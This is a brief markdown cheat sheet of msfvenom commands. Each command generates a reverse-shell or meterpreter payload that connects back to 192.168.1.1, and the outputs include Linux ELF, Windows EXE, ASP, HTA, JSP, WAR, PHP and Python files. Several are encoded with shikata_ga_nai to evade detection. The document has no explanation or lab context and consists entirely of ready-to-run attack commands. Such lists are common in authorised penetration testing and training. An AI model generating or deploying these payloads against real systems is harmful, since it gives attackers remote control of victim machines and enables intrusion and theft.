# msfvenom samples

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 -f elf -o reverse.elf

msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -b "\x00" -e x86/shikata_ga_nai -f c

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 -o shell.jsp

msfvenom -p windows/meterpreter/reverse_tcp 192.168.1.1 80 -e x86/shikata_ga_nai -i 8 -f asp -o sh.asp

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=80 VERBOSE false PrependMigrate false EXITFUNC thread -f c

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -b "\x00\x0a" -e x86/shikata_ga_nai -f c

msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.1 lport=8080 -f hta-psh > shell.hta

msfvenom -p windows/x86/reverse_tcp LHOST=192.168.1.1 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -e x86/shikata_ga_nai -i 7 -o reverse.exe

msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=80 R > ajan.php

msfvenom -p linux/x86/exec CMD=/bin/sh 192.168.1.1 80 > shell

msfvenom -p java/shell_reverse_tcp lhost=192.168.1.1 lport=80 -f war -o pwn.war

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 -f js_le -e generic/none

msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.1 LPORT=80 -f raw -o shell.py

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=443 -f elf > shell.elf
```
